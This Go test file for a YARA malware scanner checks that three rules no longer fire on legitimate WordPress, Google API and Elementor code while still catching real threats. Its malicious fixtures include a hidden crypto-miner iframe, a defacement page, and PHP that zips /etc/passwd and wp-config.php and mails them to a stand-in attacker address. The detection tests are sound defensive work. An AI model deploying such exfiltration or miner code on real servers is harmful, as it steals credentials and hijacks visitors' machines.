//go:build yara

package yara

import "testing"

// FP reconstructions for the 2026-04-27 forgetwhitecom WHM-transfer event.
// The YARA versions of these rules fired alongside their YAML siblings; the
// signature_match_realtime fixes already landed under
// internal/signatures/fp_forgetwhite_*_test.go. These pin the YARA side.

// miner_hidden_iframe used:
//
//	$iframe = /<iframe[^>]*(?:width=['"]0|height=['"]0|display:\s*none|visibility:\s*hidden)/
//	$miner  = /(?:miner|coin|mine|crypto)/ nocase
//	condition: $iframe and $miner
//
// Bug 1: width=['"]0 has no word boundary, so it matches `marginwidth="0"`
//
//	on WordPress oEmbed iframes (legit attribute, not a hiding attr).
//
// Bug 2: $miner runs across the whole file; "mine" matches the substring
//
//	in benign words like "Determines"/"discover" anywhere in WP core.
//
// Both must be inside the same iframe tag, or the miner term must be the
// content of the iframe src URL.
func TestMinerHiddenIframe_WPCoreEmbedIsNotMiner(t *testing.T) {
	scanner := loadRepoYaraScanner(t)

	// WP wp-includes/embed.php iframe template + nearby docblock copy
	// containing "Determines"/"discover" (substring "mine"/"discover"
	// matched the loose miner regex in the old rule).
	legit := []byte(`<?php
/**
 * Determines if default embed handlers should be loaded.
 */
function wp_maybe_load_embeds() {}

$output = '<iframe sandbox="allow-scripts" security="restricted" src="' . $url . '" width="' . $w . '" height="' . $h . '" frameborder="0" marginwidth="0" marginheight="0" scrolling="no" class="wp-embedded-content"></iframe>';
`)
	if hasYaraRule(scanner.ScanBytes(legit), "miner_hidden_iframe") {
		t.Error("miner_hidden_iframe FP: matched WP core embed.php (marginwidth=\"0\" is a legitimate iframe attribute, not a width=0 hider; 'mine' substring lives inside 'Determines' in unrelated docblock)")
	}
}

func TestMinerHiddenIframe_RealMiner(t *testing.T) {
	scanner := loadRepoYaraScanner(t)

	// Classic hidden cryptominer iframe shape: zero-size iframe pointing at
	// a coinhive-style domain or filename containing miner/coin/crypto.
	malicious := []byte(`<html><body>
<iframe width="0" height="0" frameborder="0" src="https://crypto-miner.example/loader.html"></iframe>
</body></html>`)
	if !hasYaraRule(scanner.ScanBytes(malicious), "miner_hidden_iframe") {
		t.Error("miner_hidden_iframe regression: width=\"0\" hidden iframe with miner src URL was not detected")
	}
}

// deface_owned_by used a single regex /[Oo]wned\s+[Bb]y\s+\w+/ -- fires on
// any "Owned by X" anywhere. Google PeopleService API field documentation
// strings ("an ad client that is not owned by the current account"),
// PhpDocReader's TokenParser comment ("doc_comment becomes owned by the
// first thing the compiler sees"), and WooCommerce CLI command docblocks
// all use the phrase legitimately.
func TestDefaceOwnedBy_GoogleApiclientFieldDocsAreNotDefaced(t *testing.T) {
	scanner := loadRepoYaraScanner(t)

	legit := []byte(`<?php
namespace Google\Service\Adsense;

class PolicyIssue extends \Google\Model {
	/**
	 * Required. The fully qualified resource name. In the latter case, this will
	 * be an ad client that is not owned by the current account.
	 */
	public $name;
}
`)
	if hasYaraRule(scanner.ScanBytes(legit), "deface_owned_by") {
		t.Error("deface_owned_by FP: matched Google API client field documentation ('owned by the current account' is a docblock describing API ownership semantics, not a defacement page)")
	}
}

func TestDefaceOwnedBy_RealHTMLDefacement(t *testing.T) {
	scanner := loadRepoYaraScanner(t)

	malicious := []byte(`<!DOCTYPE html>
<html>
<head><title>Owned by Xr00t</title></head>
<body><center><h1>Owned by Xr00t</h1></center>
<p>your security is a joke</p>
</body></html>`)
	if !hasYaraRule(scanner.ScanBytes(malicious), "deface_owned_by") {
		t.Error("deface_owned_by regression: HTML defacement page with 'Owned by' inside <title> and <h1> was not detected")
	}
}

// exfil_archive_send used:
//
//	$zip and $add and any of ($send*)
//
// where $send* is mail(/curl_exec(/readfile(. With no proximity requirement,
// any plugin that has all three tokens anywhere fires. Elementor's
// includes/template-library/sources/local.php legitimately uses ZipArchive
// for template export with addFile() and readfile() for the download path
// hundreds of lines apart.
func TestExfilArchiveSendYARA_ElementorTemplateExportIsLegit(t *testing.T) {
	scanner := loadRepoYaraScanner(t)

	legit := []byte(`<?php
namespace Elementor\TemplateLibrary;

class Source_Local {
	public function export_multiple_templates($template_ids) {
		$zip_archive = new \ZipArchive();
		$zip_archive->open($zip_complete_path, \ZipArchive::CREATE);
		foreach ($files as $f) {
			$zip_archive->addFile($f['path'], $f['name']);
		}
		$zip_archive->close();
	}

	public function send_export_archive($zip_complete_path) {
		header('Content-Type: application/zip');
		header('Cache-Control: must-revalidate');
		readfile($zip_complete_path);
	}
}
`)
	if hasYaraRule(scanner.ScanBytes(legit), "exfil_archive_send") {
		t.Error("exfil_archive_send YARA FP: matched Elementor template export (ZipArchive build + readfile download in different methods, no exfil chain)")
	}
}

func TestExfilArchiveSendYARA_RealExfilChain(t *testing.T) {
	scanner := loadRepoYaraScanner(t)

	// Real exfil shape: build a zip of victim files and send to attacker
	// via mail() or curl_exec() in the same expression chain.
	malicious := []byte(`<?php
$z = new ZipArchive();
$z->open('/tmp/d.zip', ZipArchive::CREATE);
$z->addFile('/etc/passwd');
$z->addFile('/var/www/wp-config.php');
$z->close();
$body = base64_encode(file_get_contents('/tmp/d.zip'));
mail('attacker@evil.example', 'loot', $body);
`)
	if !hasYaraRule(scanner.ScanBytes(malicious), "exfil_archive_send") {
		t.Error("exfil_archive_send YARA regression: ZipArchive + addFile + mail() exfil chain was not detected")
	}

	namespaced := []byte(`<?php
$z = new \ZipArchive();
$z->open('/tmp/d.zip', ZipArchive::CREATE);
$z->addFile('/etc/passwd');
$z->close();
mail('attacker@evil.example', 'loot', file_get_contents('/tmp/d.zip'));
`)
	if !hasYaraRule(scanner.ScanBytes(namespaced), "exfil_archive_send") {
		t.Error("exfil_archive_send YARA regression: namespaced ZipArchive + addFile + mail() exfil chain was not detected")
	}
}
